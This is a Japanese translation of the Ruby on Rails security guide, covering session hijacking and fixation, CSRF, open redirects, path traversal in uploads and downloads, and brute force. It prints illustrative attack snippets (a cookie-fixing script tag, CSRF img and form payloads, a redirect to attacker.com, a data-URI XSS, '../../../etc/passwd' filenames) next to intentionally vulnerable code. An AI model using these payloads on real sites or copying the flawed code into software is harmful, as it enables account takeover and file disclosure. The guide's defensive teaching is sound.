**DO NOT READ THIS FILE ON GITHUB, GUIDES ARE PUBLISHED ON https://guides.rubyonrails.org.**, original file md5: f769f3ad2ac56ac5949224832c8307e3
Railsアプリケーションのセキュリティ確保
===========================

このマニュアルでは、Webアプリケーションにおける一般的なセキュリティの問題と、Railsを使用してそれらを回避する方法について説明します。

このガイドを読み終えると、以下のことがわかるようになります：

* ハイライトされたすべての対策。
* Railsにおけるセッションの概念、そこに含めるべき内容、および一般的な攻撃手法。
* サイトへの単なる訪問がセキュリティの問題になる方法（CSRF）。
* ファイルの操作や管理インターフェースの提供時に注意すべき点。
* ユーザーの管理方法：ログインとログアウト、およびすべてのレイヤーにおける攻撃手法。
* そして最も一般的なインジェクション攻撃手法。

--------------------------------------------------------------------------------

はじめに
------------

Webアプリケーションフレームワークは、開発者がWebアプリケーションを構築するのを支援するために作られています。それらの中には、Webアプリケーションのセキュリティをサポートするものもあります。実際、1つのフレームワークが他のフレームワークよりも安全であるということはありません：正しく使用すれば、多くのフレームワークで安全なアプリケーションを構築することができます。例えば、Ruby on RailsにはSQLインジェクションに対する賢いヘルパーメソッドがあり、それはほとんど問題ではありません。

一般的に、プラグアンドプレイのセキュリティというものは存在しません。セキュリティは、フレームワークを使用する人々に依存し、時には開発方法にも依存します。そして、Webアプリケーション環境のすべてのレイヤーに依存します：バックエンドストレージ、Webサーバー、およびWebアプリケーション自体（および他のレイヤーやアプリケーションがあるかもしれません）。

しかし、ガートナーグループによると、攻撃の75%はWebアプリケーションレイヤーで行われており、「300の監査対象サイトのうち97%が攻撃の脆弱性を持っている」という結果が出ています。これは、Webアプリケーションが比較的攻撃しやすいためであり、それらは一般の人でも理解しやすく操作しやすいからです。

Webアプリケーションへの脅威には、ユーザーアカウントの乗っ取り、アクセス制御のバイパス、機密データの読み取りや変更、詐欺的なコンテンツの表示などがあります。また、攻撃者はトロイの木馬プログラムや迷惑メール送信ソフトウェアをインストールしたり、金銭的な利益を狙ったり、企業のリソースを変更することでブランド名の損害を引き起こすことができるかもしれません。攻撃を防止し、その影響を最小限に抑え、攻撃のポイントを排除するためには、まず攻撃手法を正しく理解し、適切な対策を見つける必要があります。それがこのガイドの目的です。

安全なWebアプリケーションを開発するためには、すべてのレイヤーについて最新の情報を把握し、敵を知る必要があります。セキュリティメーリングリストに登録したり、セキュリティブログを読んだり、更新とセキュリティチェックを習慣にすることで最新の情報を把握することができます（[追加リソース](#additional-resources)の章を参照してください）。それは手動で行われますが、それが厄介な論理的なセキュリティの問題を見つける方法です。

セッション
--------

この章では、セッションに関連する特定の攻撃と、セッションデータを保護するためのセキュリティ対策について説明します。

### セッションとは何ですか？

INFO: セッションは、ユーザーがアプリケーションとやり取りする間に、アプリケーションがユーザー固有の状態を維持するためのものです。例えば、セッションを使用することで、ユーザーは一度認証を行い、将来のリクエストに対してサインインしたままにすることができます。

ほとんどのアプリケーションは、アプリケーションとやり取りするユーザーの状態を追跡する必要があります。これは、ショッピングカートの内容や現在ログインしているユーザーのユーザーIDなどです。このようなユーザー固有の状態はセッションに保存することができます。

Railsは、アプリケーションにアクセスする各ユーザーごとにセッションオブジェクトを提供します。ユーザーが既にアクティブなセッションを持っている場合、Railsは既存のセッションを使用します。そうでない場合は新しいセッションが作成されます。

NOTE: セッションについての詳細や使用方法については、[アクションコントローラーの概要ガイド](action_controller_overview.html#session)を参照してください。

### セッションハイジャック

WARNING: _ユーザーのセッションIDを盗むことで、攻撃者は被害者の名前でWebアプリケーションを使用することができます。_

多くのWebアプリケーションには認証システムがあります：ユーザーがユーザー名とパスワードを提供し、Webアプリケーションがそれらをチェックし、対応するユーザーIDをセッションハッシュに保存します。これにより、セッションが有効になります。以降のすべてのリクエストでは、セッション中のユーザーIDによって識別されるユーザーをアプリケーションがロードし、新たな認証は必要ありません。クッキーのセッションIDがセッションを識別します。

したがって、クッキーはWebアプリケーションの一時的な認証として機能します。他の人からクッキーを奪った場合、そのユーザーとしてWebアプリケーションを使用することができます - これにより重大な結果をもたらす可能性があります。以下にセッションをハイジャックする方法とその対策方法を示します：
* セキュリティの脆弱なネットワークでクッキーを嗅ぐ。ワイヤレスLANはそのようなネットワークの一例です。暗号化されていないワイヤレスLANでは、接続されたすべてのクライアントのトラフィックを監視することが特に容易です。Webアプリケーションビルダーにとっては、_SSLを介した安全な接続を提供する_ことが重要です。Rails 3.1以降では、アプリケーションの設定ファイルで常にSSL接続を強制することができます。

    ```ruby
    config.force_ssl = true
    ```

* 多くの人々は、公共の端末で作業した後にクッキーを削除しません。したがって、前のユーザーがWebアプリケーションからログアウトしていない場合、あなたはそのユーザーとして使用することができます。Webアプリケーションには、ユーザーにログアウトボタンを提供し、_目立たせる_必要があります。

* 多くのクロスサイトスクリプティング（XSS）攻撃は、ユーザーのクッキーを取得することを目的としています。[XSSについては後で詳しく説明します](#cross-site-scripting-xss)。

* 攻撃者は、攻撃者には未知のクッキーを盗む代わりに、ユーザーのセッション識別子（クッキー内）を修正します。このようなセッション固定と呼ばれるものについては、後で詳しく説明します。

ほとんどの攻撃者の主な目的はお金を稼ぐことです。盗まれた銀行のログインアカウントの地下価格は、アカウント残高の0.5％〜10％、クレジットカード番号の場合は0.5ドル〜30ドル（詳細情報付きの場合は20ドル〜60ドル）、身元（名前、社会保障番号、生年月日）の場合は0.1ドル〜1.5ドル、小売業者アカウントの場合は20ドル〜50ドル、クラウドサービスプロバイダーアカウントの場合は6ドル〜10ドルです。[Symantecインターネットセキュリティ脅威レポート（2017年）](https://docs.broadcom.com/docs/istr-22-2017-en)によると。

### セッションストレージ

注意：Railsはデフォルトのセッションストレージとして`ActionDispatch::Session::CookieStore`を使用しています。

ヒント：他のセッションストレージについては、[Action Controller概要ガイド](action_controller_overview.html#session)を参照してください。

Railsの`CookieStore`は、セッションハッシュをクライアント側のクッキーに保存します。
サーバーはクッキーからセッションハッシュを取得し、セッションIDの必要性をなくします。これにより、アプリケーションの速度が大幅に向上しますが、これは議論の余地があるストレージオプションであり、セキュリティ上の影響とストレージ制限について考える必要があります。

* クッキーには4 kBのサイズ制限があります。セッションに関連するデータにのみクッキーを使用してください。

* クッキーはクライアント側に保存されます。クライアントは期限切れのクッキーの内容を保持する場合があります。クライアントはクッキーを他のマシンにコピーする場合があります。クッキーには機密データを保存しないでください。

* クッキーは本質的に一時的なものです。サーバーはクッキーの有効期限を設定できますが、クライアントはそれより前にクッキーとその内容を削除する場合があります。より永続的な性質のデータは、サーバーサイドに保持してください。

* セッションクッキーは自動的に無効にならず、悪意のある再利用が可能です。アプリケーションが古いセッションクッキーを格納したタイムスタンプを使用して無効にすることは良いアイデアかもしれません。

* Railsはデフォルトでクッキーを暗号化します。クライアントは暗号化を破ることなくクッキーの内容を読み取ったり編集したりすることはできません。適切に秘密を管理すれば、クッキーは一般的に安全と見なすことができます。

`CookieStore`は、セッションデータを保存するための安全で暗号化された場所を提供するために、[encrypted](https://api.rubyonrails.org/classes/ActionDispatch/Cookies/ChainedCookieJars.html#method-i-encrypted)クッキージャーを使用します。したがって、クッキーベースのセッションは内容の整合性と機密性の両方を提供します。暗号化キーと、[signed](https://api.rubyonrails.org/classes/ActionDispatch/Cookies/ChainedCookieJars.html#method-i-signed)クッキーに使用される検証キーは、`secret_key_base`の設定値から派生します。

ヒント：秘密は長くランダムである必要があります。新しい一意の秘密を取得するには、`bin/rails secret`を使用してください。

情報：[このガイドの後半で資格情報の管理について詳しく説明します](security.html#custom-credentials)

暗号化されたクッキーと署名付きクッキーには、異なるソルト値を使用することも重要です。異なるソルト構成値に同じ値を使用すると、異なるセキュリティ機能に同じ派生キーが使用される可能性があり、キーの強度が弱まる可能性があります。

テストと開発アプリケーションでは、アプリ名から派生した`secret_key_base`を取得します。他の環境では、`config/credentials.yml.enc`に存在するランダムなキーを使用する必要があります。以下は、復号化された状態で表示される`config/credentials.yml.enc`の例です。

```yaml
secret_key_base: 492f...
```

警告：アプリケーションの秘密が公開された可能性がある場合は、変更することを強く検討してください。`secret_key_base`を変更すると、現在アクティブなセッションが期限切れになり、すべてのユーザーが再ログインする必要があります。セッションデータだけでなく、暗号化されたクッキー、署名付きクッキー、Active Storageファイルも影響を受ける可能性があります。

### 暗号化されたクッキーと署名付きクッキーの設定の回転

回転は、クッキーの設定を変更し、古いクッキーがすぐに無効にならないようにするために理想的です。ユーザーはサイトを訪れ、古い設定でクッキーを読み取り、新しい変更で書き換えられるチャンスを得ることができます。ユーザーがクッキーをアップグレードする機会を十分に得たと確信できるまで、回転を削除することができます。
暗号化されたクッキーや署名付きクッキーの暗号とダイジェストを回転させることが可能です。

例えば、署名付きクッキーのダイジェストをSHA1からSHA256に変更する場合、まず新しい設定値を割り当てます。

```ruby
Rails.application.config.action_dispatch.signed_cookie_digest = "SHA256"
```

次に、既存のクッキーがシームレスに新しいSHA256ダイジェストにアップグレードされるように、古いSHA1ダイジェストの回転を追加します。

```ruby
Rails.application.config.action_dispatch.cookies_rotations.tap do |cookies|
  cookies.rotate :signed, digest: "SHA1"
end
```

これにより、書き込まれた署名付きクッキーはSHA256でダイジェストされます。SHA1で書き込まれた古いクッキーは引き続き読み取ることができ、アクセスされた場合には新しいダイジェストで書き込まれるため、アップグレードされ、回転を削除すると無効になりません。

SHA1ダイジェストで署名付きクッキーを持つユーザーがクッキーが書き換えられる可能性がなくなったら、回転を削除してください。

回転はいくつでも設定できますが、一度に多くの回転を行うことは一般的ではありません。

暗号化および署名付きメッセージのキーローテーションの詳細および`rotate`メソッドが受け入れるさまざまなオプションについては、[MessageEncryptor API](https://api.rubyonrails.org/classes/ActiveSupport/MessageEncryptor.html)および[MessageVerifier API](https://api.rubyonrails.org/classes/ActiveSupport/MessageVerifier.html)のドキュメントを参照してください。

### CookieStoreセッションのリプレイ攻撃

TIP: _`CookieStore`を使用する際に注意する必要がある攻撃の一つは、リプレイ攻撃です。_

攻撃は次のように行われます。

* ユーザーがクレジットを受け取り、その金額がセッションに保存されます（これは本来は良くないアイデアですが、デモンストレーションの目的で行います）。
* ユーザーが何かを購入します。
* 新しい調整されたクレジット値がセッションに保存されます。
* ユーザーは最初のステップでのクッキー（以前にコピーしたもの）を取得し、ブラウザ内の現在のクッキーと置き換えます。
* ユーザーは元のクレジットを取り戻します。

セッションにランダムな値であるnonce（ノンス）を含めることで、リプレイ攻撃を防ぐことができます。nonceは一度だけ有効であり、サーバーはすべての有効なnonceを追跡する必要があります。複数のアプリケーションサーバーを持っている場合はさらに複雑になります。nonceをデータベーステーブルに保存すると、CookieStoreの目的であるデータベースへのアクセスを避けることができません。

これに対する最善の解決策は、この種のデータをセッションではなくデータベースに保存することです。この場合、クレジットをデータベースに保存し、`logged_in_user_id`をセッションに保存します。

### セッションフィクセーション

NOTE: _セッションIDを盗むだけでなく、攻撃者は既知のセッションIDを固定することもできます。これをセッションフィクセーションと呼びます。_

![セッションフィクセーション](images/security/session_fixation.png)

この攻撃は、攻撃者が知っているユーザーのセッションIDを固定し、ユーザーのブラウザをこのIDを使用するように強制することに焦点を当てています。そのため、攻撃者はセッションIDを後で盗む必要はありません。この攻撃の手順は次のとおりです。

* 攻撃者は有効なセッションIDを作成します。セッションを固定したいWebアプリケーションのログインページを読み込み、レスポンスからクッキーのセッションIDを取得します（画像の1と2を参照）。
* 攻撃者は定期的にWebアプリケーションにアクセスしてセッションを維持し、期限切れにならないようにします。
* 攻撃者はユーザーのブラウザをこのセッションIDを使用するように強制します（画像の3を参照）。別のドメインのクッキーを変更することはできないため（同一生成ポリシーのため）、攻撃者はターゲットWebアプリケーションのドメインからJavaScriptを実行する必要があります。XSSによってJavaScriptコードをアプリケーションに注入することで、この攻撃を実行します。以下は例です：`<script>document.cookie="_session_id=16d5b78abb28e3d6206b60f22a03c8d9";</script>`。XSSとインジェクションについては後で詳しく説明します。
* 攻撃者はJavaScriptコードが埋め込まれた感染したページに被害者を誘導します。ページを表示することで、被害者のブラウザはセッションIDを罠のセッションIDに変更します。
* 新しい罠のセッションが未使用であるため、Webアプリケーションはユーザーに認証を要求します。
* これ以降、被害者と攻撃者は同じセッションでWebアプリケーションを共有します：セッションが有効になり、被害者は攻撃に気付きませんでした。

### セッションフィクセーション - 対策

TIP: _1行のコードでセッションフィクセーションから保護されます。_

最も効果的な対策は、_新しいセッション識別子を発行し、成功したログイン後に古い識別子を無効にする_ことです。これにより、攻撃者は固定されたセッション識別子を使用することができません。これはセッションハイジャックに対する良い対策でもあります。Railsで新しいセッションを作成する方法は次のとおりです：
```ruby
reset_session
```

人気のある[Devise](https://rubygems.org/gems/devise)ジェムを使用する場合、サインインとサインアウト時にセッションが自動的に期限切れになります。独自の方法で実装する場合は、サインインアクション（セッションが作成される時点）の後にセッションを期限切れにすることを忘れないでください。これにより、セッションから値が削除されるため、「新しいセッションに転送する必要があります」。

もう一つの対策は、「セッションにユーザー固有のプロパティを保存し、リクエストが来るたびにそれらを検証し、情報が一致しない場合はアクセスを拒否する」というものです。これらのプロパティには、リモートIPアドレスやユーザーエージェント（Webブラウザの名前）などが含まれますが、後者はユーザーに特定されにくいです。IPアドレスを保存する際には、インターネットサービスプロバイダや大規模な組織がユーザーをプロキシの背後に配置することがあることを考慮する必要があります。これらはセッションの間に変更される可能性があるため、これらのユーザーはアプリケーションを使用できないか、制限された方法でのみ使用できます。

### セッションの期限切れ

注意：「期限切れにならないセッションは、クロスサイトリクエストフォージェリ（CSRF）、セッションハイジャック、セッションフィクセーションなどの攻撃の時間枠を延長します。」

セッションIDのクッキーの有効期限を設定することができますが、クライアントはWebブラウザに保存されているクッキーを編集することができるため、サーバー上でセッションを期限切れにする方が安全です。以下は、データベーステーブル内のセッションを期限切れにする方法の例です。`Session.sweep(20.minutes)`を呼び出して、20分前よりも長く使用されたセッションを期限切れにします。

```ruby
class Session < ApplicationRecord
  def self.sweep(time = 1.hour)
    where(updated_at: ...time.ago).delete_all
  end
end
```

セッションフィクセーションに関するセクションでは、セッションの維持に関する問題が紹介されました。5分ごとにセッションを維持する攻撃者は、セッションを永遠に維持することができますが、セッションは期限切れになります。これに対する簡単な解決策は、セッションテーブルに`created_at`カラムを追加することです。これにより、長い時間前に作成されたセッションを削除できます。上記のsweepメソッド内で次の行を使用します。

```ruby
where(updated_at: ...time.ago).or(where(created_at: ...2.days.ago)).delete_all
```

クロスサイトリクエストフォージェリ（CSRF）
---------------------------------

この攻撃方法は、ユーザーが認証されたと信じられているWebアプリケーションに悪意のあるコードやリンクを含めることによって機能します。Webアプリケーションのセッションがタイムアウトしていない場合、攻撃者は不正なコマンドを実行することができます。

![クロスサイトリクエストフォージェリ](images/security/csrf.png)

[セッションの章](#sessions)では、ほとんどのRailsアプリケーションがクッキーベースのセッションを使用していることを学びました。セッションIDをクッキーに保存し、サーバーサイドのセッションハッシュを持っているか、セッションハッシュ全体がクライアントサイドにあるかのいずれかです。いずれの場合でも、ブラウザはドメインに対してクッキーを自動的に送信します。異なるドメインのサイトからのリクエストの場合、クッキーも送信されます。以下は例です。

* Bobはメッセージボードを閲覧し、ハッカーが作成した投稿を見ます。その投稿には、画像ファイルではなくBobのプロジェクト管理アプリケーションのコマンドが含まれています：`<img src="http://www.webapp.com/project/1/destroy">`
* Bobのセッションは`www.webapp.com`でまだ有効です。数分前にログアウトしていませんでした。
* 投稿を閲覧すると、ブラウザは画像タグを見つけます。`www.webapp.com`から疑わしい画像を読み込もうとします。前述のように、有効なセッションIDを持つクッキーも送信されます。
* `www.webapp.com`のWebアプリケーションは、対応するセッションハッシュ内のユーザー情報を検証し、IDが1のプロジェクトを削除します。その後、ブラウザに予期しない結果ページを返しますので、画像は表示されません。
* Bobは攻撃に気付きませんが、数日後にプロジェクト番号1がなくなっていることに気付きます。

実際のクラフトされた画像やリンクは、Webアプリケーションのドメインに配置されている必要はありません。フォーラム、ブログ投稿、またはメールのどこにでも存在する可能性があります。

CVE（Common Vulnerabilities and Exposures）では、CSRFは非常にまれに発生します（2006年の割合は0.1％未満）。しかし、これは多くのセキュリティ契約作業の結果とは対照的です。CSRFは重要なセキュリティの問題です。
### CSRF 対策

注意: _まず、W3C の要件に従って適切に GET と POST を使用してください。また、非 GET リクエストにセキュリティトークンを使用することで、CSRF からアプリケーションを保護することができます。_

#### 適切に GET と POST を使用する

HTTP プロトコルは基本的に、GET と POST の2つの主要なリクエストタイプを提供します（DELETE、PUT、PATCH は POST のように使用する必要があります）。World Wide Web Consortium (W3C) は、HTTP GET または POST を選択するためのチェックリストを提供しています。

**GET を使用する場合:**

* インタラクションが「質問のようなもの」である場合（つまり、クエリ、読み取り操作、または検索などの安全な操作である場合）。

**POST を使用する場合:**

* インタラクションが「注文のようなもの」である場合、または
* インタラクションがリソースの状態を「変更する」ものであり、ユーザーがその結果に「責任を持つ」場合（例: サービスへの購読）、または
* ユーザーがインタラクションの結果に「責任を持つ」場合。

Web アプリケーションが RESTful である場合、PATCH、PUT、DELETE などの追加の HTTP メソッドを使用することがあるかもしれません。ただし、一部の旧式の Web ブラウザはこれらをサポートしていません - GET と POST のみです。Rails では、これらのケースを処理するために、隠し `_method` フィールドを使用します。

_POST リクエストも自動的に送信することができます_。次の例では、ブラウザのステータスバーには宛先として www.harmless.com が表示されていますが、実際には動的に新しいフォームが作成され、POST リクエストが送信されています。

```html
<a href="http://www.harmless.com/" onclick="
  var f = document.createElement('form');
  f.style.display = 'none';
  this.parentNode.appendChild(f);
  f.method = 'POST';
  f.action = 'http://www.example.com/account/destroy';
  f.submit();
  return false;">To the harmless survey</a>
```

または、攻撃者は以下のように画像の onmouseover イベントハンドラにコードを配置します。

```html
<img src="http://www.harmless.com/img" width="400" height="400" onmouseover="..." />
```

他にも、JSONP や JavaScript レスポンスを持つ URL にクロスサイトリクエストを行うために `<script>` タグを使用する方法など、さまざまな可能性があります。レスポンスは攻撃者が実行できる実行可能なコードであり、機密データを抽出する可能性があります。このデータ漏洩に対して保護するために、クロスサイト `<script>` タグを許可しないようにする必要があります。ただし、Ajax リクエストはブラウザの同一オリジンポリシーに従います（自分自身のサイトのみが `XmlHttpRequest` を開始できる）。そのため、安全に JavaScript レスポンスを返すことができます。

注意: `<script>` タグのオリジン（自分自身のサイトのタグか、他の悪意のあるサイトのタグか）を区別することはできませんので、実際には自分自身のサイトから提供される安全な同一オリジンスクリプトであっても、すべての `<script>` をブロックする必要があります。この場合、明示的に `<script>` タグ向けの CSRF 保護をスキップする必要があります。

#### 必須のセキュリティトークン

その他の偽造されたリクエストに対して保護するために、サイトが知っているが他のサイトが知らない「必須のセキュリティトークン」を導入します。セキュリティトークンをリクエストに含め、サーバーで検証します。これは、[`config.action_controller.default_protect_from_forgery`][] が `true` に設定されている場合に自動的に行われます。これは、新しく作成された Rails アプリケーションのデフォルトです。また、次のようにアプリケーションコントローラに手動で追加することもできます。

```ruby
protect_from_forgery with: :exception
```

これにより、Rails が生成するすべてのフォームにセキュリティトークンが含まれます。セキュリティトークンが予想されるものと一致しない場合、例外がスローされます。

[Turbo](https://turbo.hotwired.dev/) を使用してフォームを送信する場合、セキュリティトークンも必要です。Turbo は、アプリケーションレイアウトの `csrf` メタタグからトークンを検索し、リクエストの `X-CSRF-Token` リクエストヘッダに追加します。これらのメタタグは [`csrf_meta_tags`][] ヘルパーメソッドで作成されます。

```erb
<head>
  <%= csrf_meta_tags %>
</head>
```

これにより、次のような結果が得られます。

```html
<head>
  <meta name="csrf-param" content="authenticity_token" />
  <meta name="csrf-token" content="THE-TOKEN" />
</head>
```

JavaScript から独自の非 GET リクエストを行う場合、セキュリティトークンも必要です。[Rails Request.JS](https://github.com/rails/request.js) は、必要なリクエストヘッダを追加するロジックをカプセル化した JavaScript ライブラリです。

Ajax コールを行うために別のライブラリを使用する場合、デフォルトのヘッダとしてセキュリティトークンを追加する必要があります。メタタグからトークンを取得するには、次のような方法を使用できます。

```javascript
document.head.querySelector("meta[name=csrf-token]")?.content
```

#### 永続的なクッキーのクリア

ユーザー情報を保存するために永続的なクッキーを使用することは一般的です（例: `cookies.permanent`）。この場合、クッキーはクリアされず、デフォルトの CSRF 保護は効果がありません。この情報のためにセッション以外の別のクッキーストアを使用している場合は、それに対して自分で処理する必要があります。
```ruby
ActionController::InvalidAuthenticityToken に対する rescue_from は、ApplicationController に配置することができ、CSRF トークンが存在しないか、または正しくない場合に、非 GET リクエストで呼び出されます。

注意: _クロスサイトスクリプティング (XSS) の脆弱性は、すべての CSRF 保護をバイパスします。_ XSS は、攻撃者にページ上のすべての要素へのアクセス権を与えるため、フォームから CSRF セキュリティトークンを読み取るか、フォームを直接送信することができます。[XSS について詳しく読む](#cross-site-scripting-xss)。

リダイレクションとファイル
---------------------

Web アプリケーションでのリダイレクションとファイルの使用に関連するセキュリティの脆弱性のクラスもあります。

### リダイレクション

警告: _Web アプリケーションでのリダイレクションは、過小評価されているクラッカーツールです: 攻撃者はユーザーをトラップウェブサイトに転送するだけでなく、自己完結型の攻撃を作成することもできます。_

ユーザーがリダイレクションのために URL の一部を渡すことが許可されている場合、それは脆弱性の可能性があります。最も明らかな攻撃は、ユーザーを元のアプリケーションとまったく同じように見えるフェイクのウェブアプリケーションにリダイレクトすることです。このようなフィッシング攻撃は、ユーザーにメールで疑わしくないリンクを送信したり、Web アプリケーションに XSS でリンクを注入したり、外部サイトにリンクを配置したりすることで機能します。リンクは、ウェブアプリケーションの URL で始まり、悪意のあるサイトへの URL がリダイレクションパラメータに隠されているため、疑わしくありません: http://www.example.com/site/redirect?to=www.attacker.com。以下は、レガシーアクションの例です。

```ruby
def legacy
  redirect_to(params.update(action: 'main'))
end
```

これにより、ユーザーはレガシーアクションにアクセスしようとした場合に、メインアクションにリダイレクトされます。意図は、レガシーアクションへの URL パラメータを保持し、それらをメインアクションに渡すことです。しかし、攻撃者が URL にホストキーを含めた場合、それは攻撃者のホストにユーザーをリダイレクトすることができます。

```
http://www.example.com/site/legacy?param1=xy&param2=23&host=www.attacker.com
```

URL の末尾にある場合はほとんど気づかれず、ユーザーは `attacker.com` ホストにリダイレクトされます。一般的なルールとして、ユーザーの入力を直接 `redirect_to` に渡すことは危険とされています。簡単な対策としては、レガシーアクションで_予期されるパラメータのみを含める_ことです（予期しないパラメータを削除するのではなく、許可されたリストのアプローチです）。_URL にリダイレクトする場合は、許可されたリストまたは正規表現でチェック_してください。

#### 自己完結型 XSS

Firefox と Opera で動作する別のリダイレクションと自己完結型 XSS 攻撃は、データプロトコルの使用によって行われます。このプロトコルは、ブラウザでその内容を直接表示し、HTML や JavaScript から完全な画像まで何でも表示できます。

`data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K`

この例は、シンプルなメッセージボックスを表示する Base64 エンコードされた JavaScript です。リダイレクション URL では、攻撃者はこの URL に悪意のあるコードを含めてリダイレクトすることができます。対策としては、_ユーザーに URL の (一部の) リダイレクトを許可しない_ことです。

### ファイルのアップロード

注意: _ファイルのアップロードが重要なファイルを上書きしないようにし、メディアファイルを非同期で処理します。_

多くの Web アプリケーションでは、ユーザーがファイルをアップロードできるようになっています。_ユーザーが選択できる (一部の) ファイル名は常にフィルタリングする必要があります_。攻撃者は悪意のあるファイル名を使用してサーバー上の任意のファイルを上書きすることができます。ファイルのアップロードを /var/www/uploads に保存し、ユーザーが "../../../etc/passwd" のようなファイル名を入力した場合、重要なファイルを上書きする可能性があります。もちろん、Ruby インタプリタにはそれを行うための適切な権限が必要です - ウェブサーバー、データベースサーバー、および他のプログラムを特権のない Unix ユーザーとして実行する理由のもう一つです。

ユーザー入力のファイル名をフィルタリングする際には、_悪意のある部分を削除しようとしないでください_。Web アプリケーションがファイル名のすべての "../" を削除し、攻撃者が "....//" のような文字列を使用する状況を考えてみてください - 結果は "../" になります。許可されたリストのアプローチを使用するのが最善であり、_受け入れられる文字のセットでファイル名の妥当性をチェック_します。これは、許可されていない文字を削除しようとする制限されたリストのアプローチとは対照的です。有効なファイル名でない場合は、拒否してください（または受け入れられない文字を置き換えてください）、削除しないでください。以下は、[attachment_fu プラグイン](https://github.com/technoweenie/attachment_fu/tree/master) のファイル名サニタイザーです。

```ruby
def sanitize_filename(filename)
  filename.strip.tap do |name|
    # 注意: File.basename は Unix 上の Windows パスでは正しく動作しません
    # パス全体ではなく、ファイル名のみを取得します
    name.sub!(/\A.*(\\|\/)/, '')
    # 最後に、すべての英数字、アンダースコア、ピリオド以外の文字をアンダースコアに置き換えます
    name.gsub!(/[^\w.-]/, '_')
  end
end
```

ファイルの同期処理（`attachment_fu`プラグインによる画像のアップロードなど）の重要な欠点は、_サービス拒否攻撃への脆弱性_です。攻撃者は多くのコンピュータから同期的に画像ファイルのアップロードを開始することができ、これによりサーバーの負荷が増加し、最終的にはサーバーがクラッシュまたは停止する可能性があります。

これに対する解決策は、メディアファイルを非同期に処理することです。メディアファイルを保存し、データベースに処理リクエストをスケジュールします。2番目のプロセスがバックグラウンドでファイルの処理を行います。

### ファイルアップロードにおける実行可能コード

警告: _アップロードされたファイル内のソースコードは、特定のディレクトリに配置された場合に実行される可能性があります。ApacheのホームディレクトリであるRailsの/publicディレクトリにファイルアップロードを配置しないでください。_

人気のあるApacheウェブサーバーには、DocumentRootというオプションがあります。これはウェブサイトのホームディレクトリであり、このディレクトリツリー内のすべてのものはウェブサーバーによって提供されます。特定のファイル名拡張子を持つファイルがある場合、要求されたときにその中のコードが実行されます（一部のオプションの設定が必要な場合もあります）。これにはPHPファイルやCGIファイルなどがあります。攻撃者がコードが含まれた「file.cgi」というファイルをアップロードし、誰かがそのファイルをダウンロードすると実行される状況を考えてみてください。

_もしApacheのDocumentRootがRailsの/publicディレクトリを指している場合、そこにファイルアップロードを配置しないでください_、少なくとも1つ上のレベルにファイルを保存してください。

### ファイルのダウンロード

注意: _ユーザーが任意のファイルをダウンロードできないようにしてください。_

アップロード時にファイル名をフィルタリングする必要があるように、ダウンロード時にも同様にフィルタリングする必要があります。`send_file()`メソッドはサーバーからクライアントへファイルを送信します。ユーザーが入力したファイル名をそのまま使用すると、フィルタリングせずに任意のファイルをダウンロードできます。

```ruby
send_file('/var/www/uploads/' + params[:filename])
```

単純に"../../../etc/passwd"のようなファイル名を渡すと、サーバーのログイン情報をダウンロードできます。これを防ぐためには、_要求されたファイルが予想されるディレクトリ内にあるかどうかを確認する_必要があります。

```ruby
basename = File.expand_path('../../files', __dir__)
filename = File.expand_path(File.join(basename, @file.public_filename))
raise if basename != File.expand_path(File.dirname(filename))
send_file filename, disposition: 'inline'
```

もう1つの（追加の）アプローチは、ファイル名をデータベースに保存し、ディスク上のファイルをデータベースのIDに基づいて命名することです。これは、アップロードされたファイル内の可能なコードが実行されるのを防ぐための良いアプローチです。`attachment_fu`プラグインも同様の方法でこれを行います。

ユーザー管理
---------------

注意: _ほとんどのウェブアプリケーションは認証と認可に対処する必要があります。自分で作る代わりに、一般的なプラグインを使用することをお勧めします。ただし、それらも最新の状態に保つ必要があります。いくつかの追加の注意事項により、アプリケーションのセキュリティをさらに向上させることができます。_

Railsにはさまざまな認証プラグインがあります。人気のある[devise](https://github.com/heartcombo/devise)や[authlogic](https://github.com/binarylogic/authlogic)などのプラグインは、暗号化されたパスワードのみを保存し、平文のパスワードを保存しません。Rails 3.1以降では、セキュアなパスワードのハッシュ化、確認、回復メカニズムをサポートする組み込みの[`has_secure_password`](https://api.rubyonrails.org/classes/ActiveModel/SecurePassword/ClassMethods.html#method-i-has_secure_password)メソッドも使用できます。

### アカウントのブルートフォース攻撃

注意: _アカウントへのブルートフォース攻撃は、ログイン資格情報の試行錯誤攻撃です。より一般的なエラーメッセージを表示し、CAPTCHAの入力を要求することでこれを防ぎます。_

ウェブアプリケーションのユーザー名のリストは、ほとんどの人が洗練されたパスワードを使用していないため、対応するパスワードのブルートフォース攻撃に悪用される可能性があります。ほとんどのパスワードは辞書の単語と数字の組み合わせです。したがって、ユーザー名のリストと辞書を持っていると、自動プログラムは数分で正しいパスワードを見つけることができます。

そのため、ほとんどのウェブアプリケーションでは、ユーザー名またはパスワードが正しくない場合に一般的なエラーメッセージ「ユーザー名またはパスワードが正しくありません」と表示されます。もし「入力したユーザー名が見つかりませんでした」と表示された場合、攻撃者は自動的にユーザー名のリストを作成することができます。

しかし、ほとんどのウェブアプリケーションデザイナーが見落としているのは、パスワードを忘れた場合のページです。これらのページでは、入力したユーザー名やメールアドレスが（見つかったかどうか）表示されることが多いです。これにより、攻撃者はユーザー名のリストを作成し、アカウントのブルートフォース攻撃を行うことができます。

このような攻撃を緩和するために、_パスワードを忘れたページでも一般的なエラーメッセージを表示_するようにしてください。さらに、_特定のIPアドレスからの一定数のログイン失敗後にCAPTCHAの入力を要求_することもできます。ただし、これは自動プログラムに対する完全な解決策ではありません。なぜなら、これらのプログラムはIPアドレスを頻繁に変更することができるからです。ただし、攻撃の障壁を高める効果があります。
### アカウントハイジャック

多くのウェブアプリケーションは、ユーザーアカウントのハイジャックを容易にするものです。なぜ異なるアプローチを取らずに、より困難にするのでしょうか。

#### パスワード

攻撃者がユーザーのセッションクッキーを盗んだ場合、アプリケーションを共有利用することができます。パスワードを簡単に変更できる場合、攻撃者は数回のクリックでアカウントをハイジャックします。また、パスワード変更フォームがCSRFに対して脆弱である場合、攻撃者はCSRFを実行するクラフトされたIMGタグがあるウェブページに被害者を誘導することで、被害者のパスワードを変更することができます。対策としては、もちろん「パスワード変更フォームをCSRFから守る」ことです。また、「変更時にユーザーに古いパスワードの入力を要求する」ことも必要です。

#### Eメール

しかし、攻撃者はメールアドレスを変更することでアカウントを乗っ取ることもできます。メールアドレスを変更した後、忘れたパスワードページに移動し、（おそらく新しい）パスワードが攻撃者のメールアドレスに送信されます。対策としては、「メールアドレスの変更時にもパスワードの入力を要求する」ことです。

#### その他

